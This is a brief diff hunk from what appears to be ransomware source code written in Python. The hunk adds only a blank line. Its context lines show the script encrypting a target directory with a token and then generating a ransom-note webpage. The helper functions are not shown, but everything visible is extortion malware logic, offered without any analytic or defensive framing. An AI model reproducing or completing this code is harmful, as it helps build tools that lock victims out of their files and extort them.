@@ -94,6 +94,7 @@ if not os.path.exists(target):
     exit()
 
     # Encrypt the target directory
+
     if os.path.isdir(target):
         encrypt_directory(target, TOKEN)
         create_ransom_note_webpage(target)
